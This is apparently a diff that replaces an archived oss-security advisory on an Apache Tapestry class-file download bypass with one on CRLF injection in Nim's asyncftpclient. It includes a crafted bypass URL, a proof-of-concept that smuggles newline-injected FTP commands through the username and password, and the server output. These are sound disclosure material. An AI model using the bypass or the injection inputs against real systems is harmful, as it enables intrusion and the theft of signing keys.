@@ -1,74 +1,110 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/04/15/1
-Message-ID: <CAE_88GZCZPNLtUbT9K_dJ9Y=b18pKu3Us3BkE5ueZAUnvnSsnQ@mail.gmail.com>
-Date: Wed, 14 Apr 2021 19:08:10 -0300
-From: "Thiago H. de Paula Figueiredo" <thiagohp@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/02/04/3
+Message-Id: <F0E1DB22-8CF0-46D2-9E59-C45FF50D2C2C@consensys.net>
+Date: Thu, 4 Feb 2021 15:58:23 +0100
+From: Martin Ortner <martin.ortner@...sensys.net>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2021-27850: Apache Tapestry: Bypass of the fix for CVE-2019-0195
+Subject: [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection
 Content-Type: text/plain; charset=utf-8
 
-Description:
+title: "Nim - stdlib asyncftpd - Crlf Injection"
+date: 2021-02-04T15:25:49+01:00
 
-A critical unauthenticated remote code execution vulnerability was found
+cve: ["CVE-2020-15690"]
+vendor: nim-lang
+vendorUrl: https://nim-lang.org/
+authors: tintinweb
+affectedVersions: [ "< 1.2.6" ]
+vulnClass: CWE-93
 
-all recent versions of Apache Tapestry.
+Vulnerability Note: https://consensys.net/diligence/vulnerabilities/nim-asyncftpd-crlf-injection/
+Vulnerability Note: https://github.com/tintinweb/pub/tree/master/pocs/cve-2020-15690
+Group: https://consensys.net/diligence/research/
 
-The affected versions include 5.4.5, 5.5.0, 5.6.2 and 5.7.0.
 
-The vulnerability I have found is a bypass of the fix for CVE-2019-0195.
 
-Recap:
+# Vulnerability Note
 
-Before the fix of CVE-2019-0195 it was possible to download arbitrary
+## Summary 
 
-class files from the classpath by providing a crafted
+In Nim before 1.2.6, the standard library asyncftpclient lacks a check for whether a message contains a newline character.
 
-asset file URL.
+## Details
 
-An attacker was able to download the file `AppModule.class` by
+### Description
 
-requesting the URL
+The nim standard library `asyncftpclient` is vulnerable to multiple `CR-LF` injections. An injection is possible if the attacker controls any argument that is passed to the remote server such as the `username` and `password` to `newAsyncFtpClient`. 
 
-`http://localhost:8080/assets/something/services/AppModule.class`
 
-which contains a HMAC secret key.
+The root cause of this issue is that the `send(ftp, msg)` allows `msg` to contain `CR-LF` control characters. An attacker that controls any unchecked input to `send()` can therefore inject arbitrary FTP commands. 
 
-The fix for that bug was a blacklist filter that checks if the URL
+```nim
+proc send*(ftp: AsyncFtpClient, m: string): Future[TaintedString] {.async.} =
+  ## Send a message to the server, and wait for a primary reply.
+  ## ``\c\L`` is added for you.
+  ##
+  ## **Note:** The server may return multiple lines of coded replies.
+  await ftp.csock.send(m & "\c\L")
+  return await ftp.expectReply()
+```
 
-ends with `.class`, `.properties` or `.xml`.
 
-Bypass:
+### Proof of Concept
 
-Unfortunately, the blacklist solution can simply be bypassed by
+Note: `nim c -r -d:ssl  crlf_inject.nim`
 
-appending a `/` at the end of the URL:
+* Injecting FTP commands via `user` and `pass`
 
-`http://localhost:8080/assets/something/services/AppModule.class/`
+```nim
+import asyncdispatch, asyncftpclient
+proc main() {.async.} =
+  var ftp = newAsyncFtpClient("localhost", user = "test\nINJECTED_LINE test test", pass = "test\nINJECTED_LINE test test 2")
+  await ftp.connect()
+  echo("Connected")
+waitFor(main())
+```
 
-The slash is stripped after the blacklist check and the file
+Output:
 
-`AppModule.class` is loaded into the response.
+```
+⇒ nim c -r -d:ssl  crlf_inject.nim
+...
+Hint: 104717 LOC; 1.030 sec; 113.309MiB peakmem; Debug build; proj: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject.nim; out: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject [SuccessX]
+Hint: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject  [Exec]
+Connected
+```
 
-This class usually contains the HMAC secret key which is used to sign
 
-serialized Java objects.
+```
+⇒  nc -l 21
+220 fake ftp
+USER test
+INJECTED_LINE test test
+230 Hi test, thanks for injecting a line...
+PASS test
+INJECTED_LINE test test 2
+230 thx for injecting another line...
+```
 
-With the knowledge of that key an attacker can sign a Java gadget
+### Proposed Fix
 
-chain that leads to RCE (e.g. CommonsBeanUtils1 from ysoserial).
+- properly validate user input
+- raise an exception if `CR` or `LF` if found in the `msg` passed to `send()` 
 
-Solution for this vulnerability:
+## Vendor Response
 
-* For Apache Tapestry 5.4.0 to 5.6.2, upgrade to 5.6.2 or later.
+Vendor response: fixed in 1.2.6
 
-* For Apache Tapestry 5.7.0, upgrade to 5.7.1 or later.
+### Timeline
 
-This issue is being tracked as TAP5-2663
+```
+JUL/13/2020 - contact dom96//AT//telegram; provided details, PoC
+FEB/04/2020 - public disclosure
+```
 
-Credit:
+## References
 
-Apache Tapestry would like to thank Johannes Moritz for finding and
-notifying this vulnerability
--- 
-Thiago
+* [1] https://nim-lang.org/
+* [2] https://nim-lang.org/install.html
+* [3] https://en.wikipedia.org/wiki/Nim_(programming_language)
 
